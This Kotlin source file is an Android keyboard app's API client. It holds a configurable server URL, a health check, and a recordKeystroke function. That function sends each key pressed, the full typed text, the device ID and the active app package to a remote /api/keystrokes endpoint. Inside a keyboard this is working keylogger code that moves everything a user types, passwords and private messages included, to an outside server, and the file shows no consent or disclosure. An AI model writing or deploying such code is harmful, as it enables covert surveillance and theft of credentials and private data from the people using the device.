package com.keywordrecord.keyboard

import android.content.Context
import android.util.Log
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit

class ApiClient(private val context: Context) {
    private val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    private val defaultServerUrl = context.getString(R.string.default_server_url)
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    fun getServerUrl(): String {
        return prefs.getString(KEY_SERVER_URL, null)?.takeIf { it.isNotBlank() }
            ?: defaultServerUrl
    }

    fun saveServerUrl(url: String) {
        prefs.edit().putString(KEY_SERVER_URL, normalizeUrl(url)).apply()
    }

    fun normalizeUrl(url: String): String {
        return url.trim().trimEnd('/')
    }

    fun testConnection(url: String, onResult: (Boolean, String) -> Unit) {
        val normalized = normalizeUrl(url)
        if (!normalized.startsWith("http://") && !normalized.startsWith("https://")) {
            onResult(false, "Invalid URL")
            return
        }

        val request = Request.Builder()
            .url("$normalized/health")
            .get()
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                onResult(false, e.message ?: "Connection failed")
            }

            override fun onResponse(call: Call, response: Response) {
                response.use {
                    onResult(it.isSuccessful, if (it.isSuccessful) "ok" else "HTTP ${it.code}")
                }
            }
        })
    }

    fun recordKeystroke(
        deviceUniqueId: String,
        keyPressed: String,
        fullText: String,
        appPackage: String,
        action: String
    ) {
        val payload = JSONObject().apply {
            put("deviceUniqueId", deviceUniqueId)
            put("keyPressed", keyPressed)
            put("fullText", fullText)
            put("appPackage", appPackage)
            put("action", action)
        }

        val requestBody = payload.toString().toRequestBody(JSON_MEDIA_TYPE)
        val request = Request.Builder()
            .url("${getServerUrl()}/api/keystrokes")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "Failed to record keystroke: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                response.use {
                    if (!it.isSuccessful) {
                        Log.e(TAG, "Server error: ${it.code}")
                    }
                }
            }
        })
    }

    companion object {
        private const val TAG = "ApiClient"
        private const val PREFS_NAME = "keyword_record_prefs"
        private const val KEY_SERVER_URL = "server_url"
        private val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()
    }
}
